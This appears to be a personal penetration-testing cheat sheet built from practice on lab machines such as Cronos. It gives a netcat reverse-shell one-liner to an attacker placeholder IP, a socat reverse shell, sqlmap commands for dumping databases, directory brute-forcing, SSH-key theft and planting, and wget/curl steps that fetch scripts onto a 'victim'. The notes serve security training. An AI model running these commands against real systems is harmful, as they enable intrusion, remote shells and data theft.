<link href="../../styles.module.css" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&display=swap" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&family=Zen+Tokyo+Zoo&display=swap" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&family=Encode+Sans+SC&family=Zen+Tokyo+Zoo&display=swap" rel="stylesheet">


## <span class="copyright">Useful Shit<span style="float:right;">By Shatha Barqawi</span>

<br/><br/>

_________________________


<span class="date">Last Updated: 26/Aug/2021</span> 


<br/> 

### <span class="useful_shit subtitle">Most Reliable Reverse Shell Payload  
  ```console
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER'S IP ADDRESS] [PORT OF THE ATTACKER'S CHOOSING] >/tmp/f
  ```

 <br/><br/> 

### <span class="useful_shit subtitle">Python Script That Spawns a Shell When connecting to a Reverse Shell  
```console
python -c 'import pty;pty.spawn("/bin/bash");'
```  
or   
```console
```console
python3 -c 'import pty;pty.spawn("/bin/bash");'
```
```
  <br/><br/> 

### <span class="useful_shit subtitle">SQLMAP  
* So I'm taking the machine "Cronos" as my example here because it's the first time I use `sqlmap` in.
* We can enumerate the databases names by writing the following line:
  ```console
  sqlmap -u [LINK OF VICTIM] --data='username=&password=' --method POST --dbs --batch
  ```
* In addition to the databases' names the previous line also provided me with the version of the SQL on the server. 
* `--batch` answers the questions for me with the default. 
<br/>
* We can also get the tables' names by writing the following line:
  ```console
  sqlmap -u [LINK OF VICTIM] --data="username=&password=" --method POST -D [DATABASE NAME] --dump all --batch
  ```
* When using this command I also got the content of the admin table. 
* Sqlmap seems to use the SQLi vulnerability in the application to gain access to:
  * Determine the schema of the database (database, table and column names).
  * Dump data from tables.
  * Potentially upload or download files to the database server machine.
  * Perform out-of-band tests.
  * Dump usernames, password hashes, privileges and roles.
  * Pass hashes off to a password cracker for a dictionary attack.
  * Perform "blind" and "boolean-based" sql injection attacks (if the web application doesn't return any error messages then sqlmap is the most time-saving tool in this case).
  * Potentially even launch a remote shell on the database server.

 <br/><br/> 

### <span class="useful_shit subtitle">Robots.txt  

<blockquote>
The file robots.txt is used to give instructions to web robots, such as search engine crawlers, about locations within the web site that robots are allowed, or not allowed, to crawl and index.  
The presence of the robots.txt does not in itself present any kind of security vulnerability. However, it is often used to identify restricted or private areas of a site's contents. The information in the file may therefore help an attacker to map out the site's contents, especially if some of the locations identified are not linked from elsewhere in the site. If the application relies on robots.txt to protect access to these areas, and does not enforce proper access control over them, then this presents a serious vulnerability.
</blockquote>  

 <br/><br/> 

### <span class="useful_shit subtitle">Gobuster Bruteforcing Directories and Subdomains  
* Command to bruteforece in `DIR` mode  
```console
gobuster dir -u [VICTIM'S LINK] -x [LIST OF EXTENSIONS] -w [WORDLIST PATH]
```  

* Command to bruteforce `DNS` mode  
```console
gobuster dns -d [WEB SERVICE DOMAIN] -W [WORDLIST PATH]
```

 <br/><br/> 

### <span class="useful_shit subtitle">DNS Zone Transfer  
* Definition?
  Is the process of copying the contents of the zone file on a primary DNS server to a secondary DNS server.  
  And this way fault tolerance is provided.

 <br/><br/> 

### <span class="useful_shit subtitle">Dirsearch  

* Check out <a href="https://github.com/maurosoria/dirsearch">this link</a> to git clone it.
* We can use it instead of Dirbuster or Gobuster.

 <br/><br/> 

### <span class="useful_shit subtitle">PrivEsc 😈


* `cat /etc/shells`   
* Shows me what shells the machine uses  



<br/>

* `[COMMAND] | tee [FILE NAME]` 
* Stores output of the command in a file.  

<br/>

* `dpkg -l`  
* Shows the packages and libraries on system.
* I think this command is only for Debian based OSes 🤔.

<br/>

* `/usr/share/exploitdb/exploits`
* ExploitDB's exploits are saved in this path.  

<br/>

* Tools we can use to make life easier  
* <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>, <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPeas</a>, <a href="https://github.com/diego-treitos/linux-smart-enumeration">Linux-Smart-Enumeration</a> and <a href="https://github.com/DominicBreuker/pspy">Pspy</a>.  

<br/>

* Some info on gcc  
* The option `-Wall` is a warning option.  


 <br/><br/> 

### <span class="useful_shit subtitle">Searchsploit  

* `searchsploit -x [EXPLOIT PATH]`
* Can be used to view the exploit code.

<br/>

* `searchsploit -m [EXPLOIT PATH]`
* Copies the exploit to my working directory 😱.

<br/>

* People that name exploits sometimes name the versions wrongly. So, don't trusts the version in the name of the exploit.   

 <br/><br/> 

### <span class="useful_shit subtitle">Upgrading The Reverse Shell   

* The bitch machine Cronos keeps making problems for me and I can't seem to open the admin some times. So I wasn't able to test the ways I'll be mentioning next (I got them from this <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">website</a>)  

<br/>  

* Using Python for a psuedo terminal  
```console
python -c 'import pty; pty.spawn("/bin/bash")'
```  

* Using socat  WORKED INSTEAD OF `nc`
```console
#Listener
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim  
socat exec:'bash -li',pty,stderr,setsid,sane tcp:10.0.3.4:4444
```  

* Using stty options NOT WORKING WITH ME  
```console
# In reverse shell 
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl-z  

# In Kali 
stty raw -echo  
fg

# In reverse shell
reset
export ShELL=bash
export TERM=xterm-256color
stty row <num> columns <cols>
```  
* If we type `stty -a` it will give me info and I can get the rows and columns from there.
* I can also echo the $TERM variable and put its value in the reverse shell as the value I have on my Kali.  

 <br/><br/> 

### <span class="useful_shit subtitle">sudo  

* It can be used to run commands as another user (root is one of them but not the only one). I think by default it runs as root and if I want to run as another user I can use `sudo -u [USERNAME] [COMMAND]`.


 <br/><br/> 

### <span class="useful_shit subtitle">SSH Keys  
* We can use ssh keys to privesc  

    ```console
    Shatha Barqawi@htb[/htb]$ vim id_rsa
    Shatha Barqawi@htb[/htb]$ chmod 600 id_rsa
    Shatha Barqawi@htb[/htb]$ ssh user@10.10.10.10 -i id_rsa

    root@remotehost#
    ```  

* This ssh key can be found in the following path if I have access to it `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`.

    <blockquote>
    Note that we used the command 'chmod 600 id_rsa' on the key after we created it on our machine to change the file's permissions to be more restrictive. If ssh keys have lax permissions, i.e., maybe read by other people, the ssh server would prevent them from working.
    </blockquote>  

* We can also put our public key in the directory `/home/user/.ssh/authorized_keys` if we have the permissions to do so. How to do that?  

1. Create key on my machine 
   ```console
   Shatha Barqawi@htb[/htb]$ ssh-keygen -f key
   ```
   * This will create two file `key` (which we will use with `ssh -i`) and `key.pub`(which we will copy to the remote machine).

 <br/><br/> 

### <span class="useful_shit subtitle">Transferring Files  

1. Using `wget`  
* We run a Python HTTP server on our machine and wget or cURL on the victim to download the file   

* On my machine
  ```console
  Shatha Barqawi@htb[/htb]$ cd /tmp
  Shatha Barqawi@htb[/htb]$ python3 -m http.server 8000

  Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
  ```

* On victim  
  ```console
  user@remotehost$ wget http://10.10.14.1:8000/linenum.
  ```  
  OR   
  ```console
  user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
  ```  

2. Using `scp`  

   ```
   scp [PATH TO FILE ON MY SYSTEM] [USERNAME]@[TARGET IP]:[PATH ON TARGET TO TRANSFER FILE TO]
   ```

3. Using `base64`  
* In some cases, there might be firewall protections that prevent us from downloading a file from our machine. In such case we can use `base64` and encode the file into base64 format and then copy/paste the base64 string to the remote server and decode it there.   
  ```console
  Shatha Barqawi@htb[/htb]$ base64 shell -w 0
  ```  

  ```console
  user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA...SNIO...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
  ```  

* To check that we didn't miss anything up during the encoding/deconding process we can use the command `md5sum [FILENAME]` on both machines and check if they're equal.  

 <br/><br/> 

### <span class="useful_shit subtitle">Nmap  

* We can use the option `-oA [FILE NAME]` to save the nmap output in a file in the working directory.
  ```console
  nmap -p- --open -oA nibbles_full_tcp_scan 10.129.42.190
  ``` 

 <br/><br/> 

### <span class="useful_shit subtitle">Web Testing  

* We can use the command `whatweb [IP ADDRESS]` to see info about the web server.


 sqlmap -u "http://10.10.10.143/room.php?cod=1" --dbs 

//Try to use this syntax instead (It's more reliable)
sqlmap -r attack.txt --dbs   


